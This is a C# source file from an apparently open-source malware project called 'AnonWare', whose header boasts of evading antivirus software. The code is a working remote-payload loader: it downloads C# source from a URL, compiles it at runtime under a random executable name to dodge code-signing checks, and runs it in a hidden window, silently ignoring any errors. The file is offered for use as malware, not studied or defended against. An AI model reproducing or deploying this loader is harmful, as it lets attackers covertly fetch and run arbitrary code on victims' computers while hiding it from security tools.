//this code is just like a little playground where you make the code before putting it into the 'first launcher' this code does absolutely nothing before you put it into Program.cs


/*  Welcome to a New age of malware...
 *
 *  One where AV software can't pick out the latest strain of malware,
 *  one where it is open source and always changing-improving-evading.
 *  An age in which this is only the begining. You can try to stop
 *  AnonWare, but you can't stop what's to come.
 *  We Do Not Forgive. We Do Not Forget.
 *  Expect US.
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using Microsoft.CSharp;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Management;
using System.Threading;
using System.CodeDom.Compiler;
using System.Net;
using System.IO;

namespace AnonWare
{
    class Program
    {
        static void MainREMOVETHIS()
        {
            compile();
        }
        public static string watsdasource;
        static void compile()
        {
            //we're using runtime compilation instead of just downloading an exe to go around the whole program is not signed by msft shit
            try
            {
                CSharpCodeProvider myCodeProvider = new CSharpCodeProvider();
                ICodeCompiler myCodeCompiler = myCodeProvider.CreateCompiler();
                String[] referenceAssemblies = { "System.dll" }; //if you plan to do more than really simple stuff with it, add stuff to this list (seperate them with commas)
                string myAssemblyName = GetPassword() + ".exe";
                CompilerParameters myCompilerParameters = new CompilerParameters(referenceAssemblies, myAssemblyName);
                myCompilerParameters.GenerateExecutable = true;
                myCompilerParameters.GenerateInMemory = true;
                WebClient x = new WebClient();
                Stream y = x.OpenRead("http://sumsite.com/sumfile.txt"); //link to txt file containing source code (nothing matters except that it's a text file, name it anything you want)
                StreamReader z = new StreamReader(y);
                string source = z.ReadToEnd();
                if (source != watsdasource)
                {
                    watsdasource = source;
                    z.Close();
                    y.Close();
                    CompilerResults compres = myCodeCompiler.CompileAssemblyFromSource(myCompilerParameters, source);
                    Process cmd = new Process();
                    cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    cmd.StartInfo.FileName = myAssemblyName;
                    cmd.Start();
                }
                else
                {
                    z.Close();
                    y.Close();
                }
            }
            catch
            {
                //uh oh...
            }
        }
        //for all your randomness needs! ^_^
        public static string GetPassword()
        {
            StringBuilder builder = new StringBuilder();
            builder.Append(RandomString(4, true));
            builder.Append(RandomNumber(1000, 9999));
            builder.Append(RandomString(2, false));
            return builder.ToString();
        }
        private static int RandomNumber(int min, int max)
        {
            Random random = new Random();
            return random.Next(min, max);
        }
        private static string RandomString(int size, bool lowerCase)
        {
            StringBuilder builder = new StringBuilder();
            Random random = new Random();
            char ch;
            for (int i = 0; i < size; i++)
            {
                ch = Convert.ToChar(Convert.ToInt32(Math.Floor(26 * random.NextDouble() + 65)));
                builder.Append(ch);
            }
            if (lowerCase)
            {
                return builder.ToString().ToLower();
            }
            return builder.ToString();
        }
    }
}
